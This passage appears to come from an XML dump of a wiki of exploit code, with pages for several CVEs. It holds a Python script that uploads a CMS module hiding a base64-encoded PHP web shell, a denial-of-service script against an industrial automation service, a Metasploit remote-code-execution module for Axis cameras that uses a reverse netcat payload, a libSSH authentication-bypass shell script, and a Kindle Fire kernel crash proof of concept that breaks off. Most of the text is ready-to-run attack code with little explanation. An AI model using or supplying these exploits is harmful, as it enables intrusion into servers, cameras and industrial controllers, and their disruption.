burp0_data="-----------------------------207726338310671742711263591267\r\nContent-Disposition: form-data; name=\"mact\"\r\n\r\nModuleManager,m1_,local_import,0\r\n-----------------------------207726338310671742711263591267\r\nContent-Disposition: form-data; name=\"__c\"\r\n\r\n9a63802b6c4579cc01c\r\n-----------------------------207726338310671742711263591267\r\nContent-Disposition: form-data; name=\"m1_upload\"; filename=\"test.xml\"\r\nContent-Type: text/xml\r\n\r\n&lt;module&gt;\n    &lt;dtdversion&gt;1.3&lt;/dtdversion&gt;\n    &lt;name&gt;Matomo&lt;/name&gt;\n    &lt;version&gt;0.0.1&lt;/version&gt;\n    &lt;mincmsversion&gt;2.1.5&lt;/mincmsversion&gt;\n    &lt;help&gt;&lt;![CDATA[LS0gTWlzc2luZyBMYW5ndWFnZXN0cmluZzogaGVscCAtLQ==]]&gt;&lt;/help&gt;\n    &lt;about&gt;&lt;![CDATA[PGJyIC8+QXV0aG9yOiBleWVkZWUtbWVkaWEgJmx0O21vcnRlbkBwb3Vsc2VuLm9yZyZndDs8YnIgLz48YnIgLz5WZXJzaW9uOiAwLjAuMTxiciAvPjxiciAvPkNoYW5nZSBIaXN0b3J5OjxiciAvPi0tIE1pc3NpbmcgTGFuZ3VhZ2VzdHJpbmc6IGNoYW5nZWxvZyAtLTxiciAvPg==]]&gt;&lt;/about&gt;\n    &lt;description&gt;&lt;![CDATA[-- Missing Languagestring: admindescription --]]&gt;&lt;/description&gt;\n    &lt;file&gt;\n      &lt;filename&gt;/&lt;/filename&gt;\n      &lt;isdir&gt;1&lt;/isdir&gt;\n    &lt;/file&gt;\n    &lt;file&gt;\n      &lt;filename&gt;/action.admin_settings.php&lt;/filename&gt;\n      &lt;isdir&gt;0&lt;/isdir&gt;\n      &lt;data&gt;&lt;![CDATA[PCEtLSBTaW1wbGUgUEhQIEJhY2tkb29yIEJ5IERLIChPbmUtTGluZXIgVmVyc2lvbikgLS0+DQo8IS0tIFVzYWdlOiBodHRwOi8vdGFyZ2V0LmNvbS9zaW1wbGUtYmFja2Rvb3IucGhwP2NtZD1jYXQrL2V0Yy9wYXNzd2QgLS0+DQo8P3BocCBpZihpc3NldCgkX1JFUVVFU1RbJ2NtZCddKSl7IGVjaG8gIjxwcmU+IjsgJGNtZCA9ICgkX1JFUVVFU1RbJ2NtZCddKTsgc3lzdGVtKCRjbWQpOyBlY2hvICI8L3ByZT4iOyBkaWU7IH0/Pg==]]&gt;&lt;/data&gt;\n    &lt;/file&gt;\n    &lt;file&gt;\n      &lt;filename&gt;/action.admin_statistics.php&lt;/filename&gt;\n      &lt;isdir&gt;0&lt;/isdir&gt;\n      &lt;data&gt;&lt;![CDATA[PD9waHANCmlmICghZnVuY3Rpb25fZXhpc3RzKCJjbXNtcyIpKSByZXR1cm47DQokYXBpdG9rZW4gPSR0aGlzLT5HZXRQcmVmZXJlbmNlKCJhcGl0b2tlbiIpOw0KJHNpdGVpZD0kdGhpcy0+R2V0UHJlZmVyZW5jZSgic2l0ZWlkIik7DQokbGFuZ3VhZ2U9JHRoaXMtPkdldFByZWZlcmVuY2UoImxhbmd1YWdlIiwiZW4iKTsNCg0KJGVtYmVkX2Rhc2hib2FyZCA9ICc8aWZyYW1lIHN0eWxlPSJkaXNwbGF5OmJsb2NrOyIgc3JjPSInIC4gJHRoaXMtPkdldFByZWZlcmVuY2UoImJhc2V1cmwiKQ0KICAuICcvaW5kZXgucGhwP21vZHVsZT1XaWRnZXRpemUmYWN0aW9uPWlmcmFtZSZtb2R1bGVUb1dpZGdldGl6ZT1EYXNoYm9hcmQmYWN0aW9uVG9XaWRnZXRpemU9aW5kZXgmaWRTaXRlPScgLiAkc2l0ZWlkDQogIC4gJyZ0b2tlbl9hdXRoPScgLiAkYXBpdG9rZW4NCiAgLiAnJnBlcmlvZD1tb250aCcNCiAgLiAnJmRhdGU9dG9kYXknDQogIC4gJyZsYW5ndWFnZT0nLiRsYW5ndWFnZQ0KICAuICciIGZyYW1lYm9yZGVyPSIwIiBtYXJnaW5oZWlnaHQ9IjAiIG1hcmdpbndpZHRoPSIwIiB3aWR0aD0iMTAwJSIgaGVpZ2h0PSI4MDBweCcNCiAgLiAnIj48L2lmcmFtZT4nOw0KDQoNCmVjaG8gJGVtYmVkX2Rhc2hib2FyZDsNCg0KDQoNCi8qDQplY2hvICR0aGlzLT5TdGFydFRhYkhlYWRlcnMoKTsNCg0KZWNobyAkdGhpcy0+U2V0VGFiSGVhZGVyKCJiYXNlIiwiU2lkZXIiLCgkdGFiPT0icGFnZXMiKSk7DQplY2hvICR0aGlzLT5TZXRUYWJIZWFkZXIoInNla3Rpb25lciIsIlNla3Rpb25lciIsKCR0YWI9PSJzZWN0aW9ucyIpKTsNCi8vICBlY2hvICR0aGlzLT5TZXRUYWJIZWFkZXIoImluZHN0aWxsaW5nZXIiLCJJbmRzdGlsbGluZ2VyIiwoJHRhYj09InNldHRpbmdzIikpOw0KZWNobyAkdGhpcy0+RW5kVGFiSGVhZGVycygpOw0KDQplY2hvICR0aGlzLT5TdGFydFRhYkNvbnRlbnQoKTsNCmVjaG8gJHRoaXMtPlN0YXJ0VGFiKCJzaWRlciIpOw0KDQplY2hvICR0aGlzLT5FbmRUYWIoKTsNCg0KZWNobyAkdGhpcy0+U3RhcnRUYWIoInNla3Rpb25lciIpOw0KDQplY2hvICR0aGlzLT5FbmRUYWIoKTsNCg0KLyoNCmVjaG8gJHRoaXMtPlN0YXJ0VGFiKCJ1cGxvYWQiKTsNCiAgaW5jbHVkZV9vbmNlKGRpcm5hbWUoX19maWxlX18pLiIvdGFiLmluZHN0aWxsaW5nZXIucGhwIik7DQogIGVjaG8gJHRoaXMtPkVuZFRhYigpOw0KKi8NCi8vZWNobyAkdGhpcy0+RW5kVGFiQ29udGVudCgpOw0KDQoNCg0KLyoNCiRhcGl0b2tlbiA9JHRoaXMtPkdldFByZWZlcmVuY2UoImFwaXRva2VuIik7DQokc2l0ZWlkPSR0aGlzLT5HZXRQcmVmZXJlbmNlKCJzaXRlaWQiKTsNCg0KLy8gd2UgY2FsbCB0aGUgUkVTVCBBUEkgYW5kIHJlcXVlc3QgdGhlIDEwMCBmaXJzdCBrZXl3b3JkcyBmb3IgdGhlIGxhc3QgbW9udGggZm9yIHRoZSBpZHNpdGU9Nw0KJHVybCA9ICR0aGlzLT5HZXRQcmVmZXJlbmNlKCJiYXNldXJsIik7DQokdXJsIC49ICI/bW9kdWxlPUFQSSZtZXRob2Q9UmVmZXJyZXJzLmdldEtleXdvcmRzIjsNCiR1cmwgLj0gIiZpZFNpdGU9JHNpdGVpZCZwZXJpb2Q9bW9udGgmZGF0ZT15ZXN0ZXJkYXkiOw0KJHVybCAuPSAiJmZvcm1hdD1QSFAmZmlsdGVyX2xpbWl0PTIwIjsNCiR1cmwgLj0gIiZ0b2tlbl9hdXRoPSRhcGl0b2tlbiI7DQoNCiRmZXRjaGVkID0gZmlsZV9nZXRfY29udGVudHMoJHVybCk7DQovL2VjaG8gJGZldGNoZWQ7cmV0dXJuOw0KJGNvbnRlbnQgPSB1bnNlcmlhbGl6ZSgkZmV0Y2hlZCk7DQovL3ByaW50X3IoJGNvbnRlbnQpO3JldHVybjsNCg0KLy8gY2FzZSBlcnJvcg0KaWYgKCEkY29udGVudCkgew0KICBwcmludCgiRXJyb3IgcGFyc2luZyBkYXRhLCBjb250ZW50IGZldGNoZWQgPSAiIC4gJGZldGNoZWQpOw0KICByZXR1cm47DQp9DQoNCmlmICgkY29udGVudFsicmVzdWx0Il09PSJlcnJvciIpIHsNCiAgcHJpbnQoIkVycm9yLCBtZXNzYWdlID0gIiAuICRjb250ZW50WyJtZXNzYWdlIl0pOw0KICByZXR1cm47DQp9DQoNCnByaW50KCI8aDE+S2V5d29yZHMgZm9yIHRoZSBsYXN0IG1vbnRoPC9oMT5cbiIpOw0KZm9yZWFjaCAoJGNvbnRlbnQgYXMgJHJvdykgew0KICAka2V5d29yZCA9IGh0bWxzcGVjaWFsY2hhcnMoaHRtbF9lbnRpdHlfZGVjb2RlKHVybGRlY29kZSgkcm93WydsYWJlbCddKSwgRU5UX1FVT1RFUywgJ1VURi04JyksIEVOVF9RVU9URVMsICdVVEYtOCcpOw0KICAkaGl0cyA9ICRyb3dbJ25iX3Zpc2l0cyddOw0KDQogIHByaW50KCI8Yj4ka2V5d29yZDwvYj4gKCRoaXRzIGhpdHMpPGJyPlxuIik7DQp9DQoqLw0K]]&gt;&lt;/data&gt;\n    &lt;/file&gt;\n    &lt;file&gt;\n      &lt;filename&gt;/action.default.php&lt;/filename&gt;\n      &lt;isdir&gt;0&lt;/isdir&gt;\n      &lt;data&gt;&lt;![CDATA[PD9waHANCg0KZWNobyAkdGhpcy0+TmVvUHJvY2Vzc1RlbXBsYXRlRnJvbURhdGEoJHRoaXMtPkdldFRyYWNraW5nQ29kZSgpKTs=]]&gt;&lt;/data&gt;\n    &lt;/file&gt;\n    &lt;file&gt;\n      &lt;filename&gt;/action.savesettings.php&lt;/filename&gt;\n      &lt;isdir&gt;0&lt;/isdir&gt;\n      &lt;data&gt;&lt;![CDATA[PD9waHANCmlmICghZnVuY3Rpb25fZXhpc3RzKCJjbXNtcyIpKSByZXR1cm47DQppZiggISR0aGlzLT5DaGVja1Blcm1pc3Npb24oJ01vZGlmeSBTaXRlIFByZWZlcmVuY2VzJykgKSByZXR1cm47DQoNCg0KJHRoaXMtPk5lb1NhdmVWYWx1ZXMoJHBhcmFtcyxhcnJheSgNCiAgImJhc2V1cmwiLA0KICAidHJhY2tpbmdjb2RlIiwNCiAgImFwaXRva2VuIiwNCiAgInNpdGVpZCINCikpOw0KDQokdGhpcy0+UmVkaXJlY3QoJGlkLCAnYWRtaW5fc2V0dGluZ3MnLCAkcmV0dXJuaWQsYXJyYXkoInRhYiI9PiJzZXR0aW5ncyIsIm1vZHVsZV9tZXNzYWdlIj0+JHRoaXMtPkxhbmcoInNldHRpbmdzc2F2ZWQiKSkpOw0K]]&gt;&lt;/data&gt;\n    &lt;/file&gt;\n    &lt;file&gt;\n      &lt;filename&gt;/lang/&lt;/filename&gt;\n      &lt;isdir&gt;1&lt;/isdir&gt;\n    &lt;/file&gt;\n    &lt;file&gt;\n      &lt;filename&gt;/lang/en_US.php&lt;/filename&gt;\n      &lt;isdir&gt;0&lt;/isdir&gt;\n      &lt;data&gt;&lt;![CDATA[PD9waHANCi8qKg0KICogQ3JlYXRlZCBieSBQaHBTdG9ybS4NCiAqIFVzZXI6IG1vcnRlbg0KICogRGF0ZTogMjctMDktMjAxOA0KICogVGltZTogMDg6NTMNCiAqLw0KDQoNCiRsYW5nWyJ0aXRsZV9zdGF0aXN0aWNzIl09Ik1hdG9tbyBTdGF0aXN0aWNzIjsNCiRsYW5nWyJ0aXRsZV9zZXR0aW5ncyJdPSJNYXRvbW8gU2V0dGluZ3MiOw0KDQokbGFuZ1siYmFzZXVybCJdPSJCYXNlIFVSTCI7DQokbGFuZ1siYmFzZXVybGhlbHAiXT0iVGhlIGJhc2UgdXJsIG9mIHRoZSBNYXRvbW8taW5zdGFsbGF0aW9uLiBQbGVhc2UgaW5jbHVkZSBodHRwOi8vIG9yIGh0dHBzOi8vIjsNCiRsYW5nWyJhcGl0b2tlbiJdPSJBUEkgdG9rZW4iOw0KJGxhbmdbImFwaXRva2VuaGVscCJdPSJUaGUgQVBJIHRva2VuIGZvciBhY2Nlc3NpbmcgTWF0b21vLiBDYW4gYmUgb2J0YWluZWQgYWZ0ZXIgbG9nZ2luZyBpbnRvIHRoZSBNYXRvbW8gaW5zdGFsbGF0aW9uIjsNCiRsYW5nWyJzaXRlaWQiXT0iU2l0ZSBJRCI7DQokbGFuZ1sic2l0ZWlkaGVscCJdPSJUaGUgSUQgb2YgdGhlIHNpdGUgYXMgc2VlbiBieSB0aGUgTWF0b21vIGluc3RhbGxhdGlvbiI7DQokbGFuZ1sidHJhY2tpbmdjb2RlIl09IlRyYWNraW5nIGNvZGUiOw0KJGxhbmdbInRyYWNraW5nY29kZWhlbHAiXT0iVGhlIHRyYWNraW5nIGNvZGUgZnJvbSBNYXRvbW8gKHRoaXMgd2lsbCBwcm9iYWJseSBiZSBhdXRvZ2VuZXJhdGVkIGF0IGEgbGF0ZXIgdmVyc2lvbikiOw0KJGxhbmdbInNhdmVzZXR0aW5ncyJdPSJTYXZlIHNldHRpbmdzIjsNCiRsYW5nWyJzZXR0aW5nc3NhdmVkIl09IlNldHRpbmdzIHNhdmVkIjs=]]&gt;&lt;/data&gt;\n    &lt;/file&gt;\n    &lt;file&gt;\n      &lt;filename&gt;/Matomo.module.php&lt;/filename&gt;\n      &lt;isdir&gt;0&lt;/isdir&gt;\n      &lt;data&gt;&lt;![CDATA[]]&gt;&lt;/data&gt;\n    &lt;/file&gt;\n    &lt;file&gt;\n      &lt;filename&gt;/moduleinfo.ini&lt;/filename&gt;\n      &lt;isdir&gt;0&lt;/isdir&gt;\n      &lt;data&gt;&lt;![CDATA[W21vZHVsZV0KbmFtZSA9ICJNYXRvbW8iCnZlcnNpb24gPSAiMC4wLjEiCmF1dGhvciA9ICJleWVkZWUtbWVkaWEiCmF1dGhvcmVtYWlsID0gIm1vcnRlbkBwb3Vsc2VuLm9yZyIKbWluY21zdmVyc2lvbiA9ICIyLjEuNSIKbGF6eWxvYWRhZG1pbiA9IDAKbGF6eWxvYWRmcm9udGVuZCA9IDAK]]&gt;&lt;/data&gt;\n    &lt;/file&gt;\n    &lt;file&gt;\n      &lt;filename&gt;/templates/&lt;/filename&gt;\n      &lt;isdir&gt;1&lt;/isdir&gt;\n    &lt;/file&gt;\n    &lt;file&gt;\n      &lt;filename&gt;/templates/adminsettings.tpl&lt;/filename&gt;\n      &lt;isdir&gt;0&lt;/isdir&gt;\n      &lt;data&gt;&lt;![CDATA[e2Zvcm1fc3RhcnQgYWN0aW9uPSJzYXZlc2V0dGluZ3MifQ0KPGRpdiBjbGFzcz0icGFnZW92ZXJmbG93Ij4NCiAgICA8cCBjbGFzcz0icGFnZXRleHQiPg0KICAgICAgICA8bGFiZWwgZm9yPSJ7JGFpZH1mbGQxIj57JG1vZC0+bGFuZygiYmFzZXVybCIpfTo8L2xhYmVsPiB7KmNtc19oZWxwIGtleT0naGVscF9hcnRpY2xlX3VzZWV4cGlyeScgdGl0bGU9JHVzZWV4cGlyYXRpb250ZXh0Kn0NCiAgICA8L3A+DQogICAgPHAgY2xhc3M9InBhZ2VpbnB1dCI+DQogICAgICAgIDxpbnB1dCBpZD0ieyRhaWR9ZmxkMSIgdHlwZT0idGV4dCIgc2l6ZT0iNjQiIGxlbmd0aD0iNjQiIHZhbHVlPSJ7JG1vZC0+cHJmKCJiYXNldXJsIil9IiBuYW1lPSJ7JGFpZH1iYXNldXJsIj57JG1vZC0+bGFuZygiYmFzZXVybGhlbHAiKX0NCiAgICA8L3A+DQo8L2Rpdj4NCg0KPGRpdiBjbGFzcz0icGFnZW92ZXJmbG93Ij4NCiAgICA8cCBjbGFzcz0icGFnZXRleHQiPg0KICAgICAgICA8bGFiZWwgZm9yPSJ7JGFpZH1mbGQzIj57JG1vZC0+bGFuZygiYXBpdG9rZW4iKX06PC9sYWJlbD4geypjbXNfaGVscCBrZXk9J2hlbHBfYXJ0aWNsZV91c2VleHBpcnknIHRpdGxlPSR1c2VleHBpcmF0aW9udGV4dCp9DQogICAgPC9wPg0KICAgIDxwIGNsYXNzPSJwYWdlaW5wdXQiPg0KICAgICAgICA8aW5wdXQgaWQ9InskYWlkfWZsZDMiIHR5cGU9InRleHQiIHNpemU9IjY0IiBsZW5ndGg9IjY0IiB2YWx1ZT0ieyRtb2QtPnByZigiYXBpdG9rZW4iKX0iIG5hbWU9InskYWlkfWFwaXRva2VuIj57JG1vZC0+bGFuZygiYXBpdG9rZW5oZWxwIil9DQogICAgPC9wPg0KPC9kaXY+DQoNCjxkaXYgY2xhc3M9InBhZ2VvdmVyZmxvdyI+DQogICAgPHAgY2xhc3M9InBhZ2V0ZXh0Ij4NCiAgICAgICAgPGxhYmVsIGZvcj0ieyRhaWR9ZmxkNCI+eyRtb2QtPmxhbmcoInNpdGVpZCIpfTo8L2xhYmVsPiB7KmNtc19oZWxwIGtleT0naGVscF9hcnRpY2xlX3VzZWV4cGlyeScgdGl0bGU9JHVzZWV4cGlyYXRpb250ZXh0Kn0NCiAgICA8L3A+DQogICAgPHAgY2xhc3M9InBhZ2VpbnB1dCI+DQogICAgICAgIDxpbnB1dCBpZD0ieyRhaWR9ZmxkNCIgdHlwZT0idGV4dCIgc2l6ZT0iOCIgbGVuZ3RoPSI4IiB2YWx1ZT0ieyRtb2QtPnByZigic2l0ZWlkIil9IiBuYW1lPSJ7JGFpZH1zaXRlaWQiPnskbW9kLT5sYW5nKCJzaXRlaWRoZWxwIil9DQogICAgPC9wPg0KPC9kaXY+DQoNCjxkaXYgY2xhc3M9InBhZ2VvdmVyZmxvdyI+DQogICAgPHAgY2xhc3M9InBhZ2V0ZXh0Ij4NCiAgICAgICAgPGxhYmVsIGZvcj0ieyRhaWR9ZmxkMiI+eyRtb2QtPmxhbmcoInRyYWNraW5nY29kZSIpfTo8L2xhYmVsPiB7KmNtc19oZWxwIGtleT0naGVscF9hcnRpY2xlX3VzZWV4cGlyeScgdGl0bGU9JHVzZWV4cGlyYXRpb250ZXh0Kn0NCiAgICA8L3A+DQogICAgPHAgY2xhc3M9InBhZ2VpbnB1dCI+DQogICAgICAgIDx0ZXh0YXJlYSBpZD0ieyRhaWR9ZmxkMiIgcm93cz0iMTIiIGNvbHM9IjQwIiBuYW1lPSJ7JGFpZH10cmFja2luZ2NvZGUiPnskbW9kLT5wcmYoInRyYWNraW5nY29kZSIpfTwvdGV4dGFyZWE+DQogICAgICAgIDxici8+DQogICAgICAgIHskbW9kLT5sYW5nKCJ0cmFja2luZ2NvZGVoZWxwIil9DQogICAgPC9wPg0KPC9kaXY+DQoNCjxkaXYgY2xhc3M9InBhZ2VvdmVyZmxvdyI+DQogICAgPHAgY2xhc3M9InBhZ2V0ZXh0Ij4NCg0KICAgIDwvcD4NCiAgICA8cCBjbGFzcz0icGFnZWlucHV0Ij4NCiAgICAgICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0ieyRhaWR9c3VibWl0IiB2YWx1ZT0ieyRtb2QtPmxhbmcoInNhdmVzZXR0aW5ncyIpfSIvPg0KICAgIDwvcD4NCjwvZGl2Pg0KDQoNCntmb3JtX2VuZH0NCg==]]&gt;&lt;/data&gt;\n    &lt;/file&gt;\n&lt;/module&gt;\r\n-----------------------------207726338310671742711263591267--\r\n"
requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
 
print "Try to access your web shell at: " + target_url + "/modules/Matomo/action.admin_settings.php?cmd=ls%20-al" 
&lt;/pre&gt;</text>
      <sha1>n2sd3d3g05c6n4et2crq77357suk3hm</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-10594 Delta Electronics Delta Industrial Automation COMMGR 1.08緩衝區溢出漏洞</title>
    <ns>0</ns>
    <id>475</id>
    <revision>
      <id>677</id>
      <timestamp>2021-03-27T02:41:49Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: Delta Electronics Delta Industrial Automation COMMGR - Remote STACK-BASED BUFFER OVERFLOW # Date: 02.07.2018 # Exploit Author: t4rkd3vilz # Vend..."</comment>
      <origin>677</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="882" sha1="hdvvt474p9a2ejrigwsgctbbwlextuu" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: Delta Electronics Delta Industrial Automation COMMGR
- Remote STACK-BASED BUFFER OVERFLOW
# Date: 02.07.2018
# Exploit Author: t4rkd3vilz
# Vendor Homepage: http://www.deltaww.com/
# Software Link:
http://www.deltaww.com/Products/PluginWebUserControl/downloadCenterCounter.aspx?DID=2093&amp;DocPath=1&amp;hl=en-US
# Version:
COMMGR Version 1.08 and prior.
   DVPSimulator EH2, EH3, ES2, SE, SS2
   AHSIM_5x0, AHSIM_5x1
# Tested on: Kali Linux
# CVE : CVE-2018-10594


#Run exploit, result DOS

import socket


ip = raw_input("[+] IP to attack: ")

sarr = []
i = 0
while True:
    try:
        sarr.append(socket.create_connection((ip,502)))
        print "[+] Connection %d" % i
        crash1 = "\x41"*4164"
        sarr[i].send(crash1+'\r\n')
        i+=1
    except socket.error:
        print "[*] Server crashed "
        raw_input()
        break
&lt;/pre&gt;</text>
      <sha1>hdvvt474p9a2ejrigwsgctbbwlextuu</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-10662 Axis Network Camera 遠程命令執行漏洞</title>
    <ns>0</ns>
    <id>1212</id>
    <revision>
      <id>1517</id>
      <timestamp>2021-04-11T01:31:50Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  class MetasploitModule..."</comment>
      <origin>1517</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3442" sha1="0lpa2wxwuef7ryrr62wv1e5se6q71ji" xml:space="preserve">==EXP==
&lt;pre&gt;
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule &lt; Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  #include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      'Name'           =&gt; 'Axis Network Camera .srv to parhand RCE',
      'Description'    =&gt; %q{
        This module exploits an auth bypass in .srv functionality and a
        command injection in parhand to execute code as the root user.
      },
      'Author'         =&gt; [
        'Or Peles',       # Vulnerability discovery (VDOO)
        'wvu',            # Metasploit module
        'sinn3r',         # Metasploit module
        'Brent Cook',     # Metasploit module
        'Jacob Robles',   # Metasploit module
        'Matthew Kienow', # Metasploit module
        'Shelby Pace',    # Metasploit module
        'Chris Lee',      # Metasploit module
        'Cale Black'      # Metasploit module
      ],
      'References'     =&gt; [
        ['CVE', '2018-10660'],
        ['CVE', '2018-10661'],
        ['CVE', '2018-10662'],
        ['URL', 'https://blog.vdoo.com/2018/06/18/vdoo-discovers-significant-vulnerabilities-in-axis-cameras/'],
        ['URL', 'https://www.axis.com/files/faq/Advisory_ACV-128401.pdf']
      ],
      'DisclosureDate' =&gt; 'Jun 18 2018',
      'License'        =&gt; MSF_LICENSE,
      'Platform'       =&gt; ['unix'],# 'linux'],
      'Arch'           =&gt; [ARCH_CMD],# ARCH_ARMLE],
      'Privileged'     =&gt; true,
      'Targets'        =&gt; [
        ['Unix In-Memory',
         'Platform'    =&gt; 'unix',
         'Arch'        =&gt; ARCH_CMD,
         'Type'        =&gt; :unix_memory,
         'Payload'     =&gt; {
           'BadChars'  =&gt; ' ',
           'Encoder'   =&gt; 'cmd/ifs',
           'Compat'    =&gt; {'PayloadType' =&gt; 'cmd', 'RequiredCmd' =&gt; 'netcat-e'}
         }
        ],
=begin
        ['Linux Dropper',
         'Platform'    =&gt; 'linux',
         'Arch'        =&gt; ARCH_ARMLE,
         'Type'        =&gt; :linux_dropper
        ]
=end
      ],
      'DefaultTarget'  =&gt; 0,
      'DefaultOptions' =&gt; {'PAYLOAD' =&gt; 'cmd/unix/reverse_netcat_gaping'}
    ))
  end

  def exploit
    case target['Type']
    when :unix_memory
      execute_command(payload.encoded)
=begin
    when :linux_dropper
      execute_cmdstager
=end
    end
  end

  def execute_command(cmd, opts = {})
    rand_srv = "#{Rex::Text.rand_text_alphanumeric(8..42)}.srv"

    send_request_cgi(
      'method'    =&gt; 'POST',
      'uri'       =&gt; "/index.html/#{rand_srv}",
      'vars_post' =&gt; {
        'action'  =&gt; 'dbus',
        'args'    =&gt; dbus_send(
          method: :set_param,
          param:  "string:root.Time.DST.Enabled string:;#{cmd};"
        )
      }
    )

    send_request_cgi(
      'method'    =&gt; 'POST',
      'uri'       =&gt; "/index.html/#{rand_srv}",
      'vars_post' =&gt; {
        'action'  =&gt; 'dbus',
        'args'    =&gt; dbus_send(method: :synch_params)
      }
    )
  end

  def dbus_send(method:, param: nil)
    args = '--system --dest=com.axis.PolicyKitParhand ' \
           '--type=method_call /com/axis/PolicyKitParhand '

    args &lt;&lt;
      case method
      when :set_param
        "com.axis.PolicyKitParhand.SetParameter #{param}"
      when :synch_params
        'com.axis.PolicyKitParhand.SynchParameters'
      end

    args
  end

end
&lt;/pre&gt;</text>
      <sha1>0lpa2wxwuef7ryrr62wv1e5se6q71ji</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-10933 libSSH 身份驗證繞過漏洞</title>
    <ns>0</ns>
    <id>1203</id>
    <revision>
      <id>1507</id>
      <timestamp>2021-04-11T01:22:11Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; #!/usr/bin/env python3 import paramiko import socket import argparse from sys import argv, exit     parser = argparse.ArgumentParser(description="libSSH Authenti..."</comment>
      <origin>1507</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1433" sha1="794xn9olzqe7uxhjom6y56u86ghjklz" xml:space="preserve">==EXP==
&lt;pre&gt;
#!/usr/bin/env python3
import paramiko
import socket
import argparse
from sys import argv, exit
 
 
parser = argparse.ArgumentParser(description="libSSH Authentication Bypass")
parser.add_argument('--host', help='Host')
parser.add_argument('-p', '--port', help='libSSH port', default=22)
parser.add_argument('-log', '--logfile', help='Logfile to write conn logs', default="paramiko.log")
 
args = parser.parse_args()
 
 
def BypasslibSSHwithoutcredentials(hostname, port):
    
    sock = socket.socket()
    try:
        sock.connect((str(hostname), int(port)))
 
        message = paramiko.message.Message()
        transport = paramiko.transport.Transport(sock)
        transport.start_client()
  
        message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
        transport._send_message(message)
    
        spawncmd = transport.open_session()
        spawncmd.invoke_shell()
        return 0
    
    except paramiko.SSHException as e:
        print("TCPForwarding disabled on remote/local server can't connect. Not Vulnerable")
        return 1
    except socket.error:
        print("Unable to connect.")
        return 1
 
 
def main():
    paramiko.util.log_to_file(args.logfile)
    try:
        hostname = args.host
        port = args.port
    except:
        parser.print_help()
        exit(1)
    BypasslibSSHwithoutcredentials(hostname, port)
 
if __name__ == '__main__':
    exit(main())

&lt;/pre&gt;</text>
      <sha1>794xn9olzqe7uxhjom6y56u86ghjklz</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-11019 Amazon Kindle Fire HD (3rd) Fire OS kernel組件安全漏洞</title>
    <ns>0</ns>
    <id>1044</id>
    <revision>
      <id>1321</id>
      <timestamp>2021-04-10T01:35:58Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages  /&gt; &lt;translate&gt; ==漏洞影響== &lt;/translate&gt; &lt;pre&gt; Fire OS 4.5.5.3 &lt;/pre&gt;  ==POC== &lt;pre&gt; /*  * This is poc of Kindle Fire HD 3rd  * A bug in the ioctl interface of..."</comment>
      <origin>1321</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="16940" sha1="kle17a6ighdiqsi6vjdxkzqx0svuea4" xml:space="preserve">&lt;languages  /&gt;
&lt;translate&gt;
==漏洞影響==
&lt;/translate&gt;
&lt;pre&gt;
Fire OS 4.5.5.3
&lt;/pre&gt;

==POC==
&lt;pre&gt;
/*
 * This is poc of Kindle Fire HD 3rd
 * A bug in the ioctl interface of device file /dev/dsscomp causes the system crash via IOCTL 1118064517.
 * Related buggy struct name is dsscomp_setup_dispc_data.
 * This Poc should run with permission to do ioctl on /dev/dsscomp.
 *
 * The fowllwing is kmsg of kernel crash infomation:
 *
 *
 */
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;errno.h&gt;
#include &lt;sys/ioctl.h&gt;

const static char *driver = "/dev/dsscomp";
static command = 1118064517; 

int main(int argc, char **argv, char **env) {
    unsigned int payload[] = {
    0xffffffff,
    0x00000003,
    0x5d200040,
    0x79900008,
    0x8f5928bd,
    0x78b02422,
    0x00000000,
    0xffffffff,
    0xf4c50400,
    0x007fffff,
    0x8499f562,
    0xffff0400,
    0x001b131d,
    0x60818210,
    0x00000007,
    0xffffffff,
    0x00000000,
    0x9da9041c,
    0xcd980400,
    0x001f03f4,
    0x00000007,
    0x2a34003f,
    0x7c80d8f3,
    0x63102627,
    0xc73643a8,
    0xa28f0665,
    0x00000000,
    0x689e57b4,
    0x01ff0008,
    0x5e7324b1,
    0xae3b003f,
    0x0b174d86,
    0x00000400,
    0x21ffff37,
    0xceb367a4,
    0x00000040,
    0x00000001,
    0xec000f9e,
    0x00000001,
    0x000001ff,
    0x00000000,
    0x00000000,
    0x0000000f,
    0x0425c069,
    0x038cc3be,
    0x0000000f,
    0x00000080,
    0xe5790100,
    0x5b1bffff,
    0x0000d355,
    0x0000c685,
    0xa0070000,
    0x0010ffff,
    0x00a0ff00,
    0x00000001,
    0xff490700,
    0x0832ad03,
    0x00000006,
    0x00000002,
    0x00000001,
    0x81f871c0,
    0x738019cb,
    0xbf47ffff,
    0x00000040,
    0x00000001,
    0x7f190f33,
    0x00000001,
    0x8295769b,
    0x0000003f,
    0x869f2295,
    0xffffffff,
    0xd673914f,
    0x05055800,
    0xed69b7d5,
    0x00000000,
    0x0107ebbd,
    0xd214af8d,
    0xffff4a93,
    0x26450008,
    0x58df0000,
    0xd16db084,
    0x03ff30dd,
    0x00000001,
    0x209aff3b,
    0xe7850800,
    0x00000002,
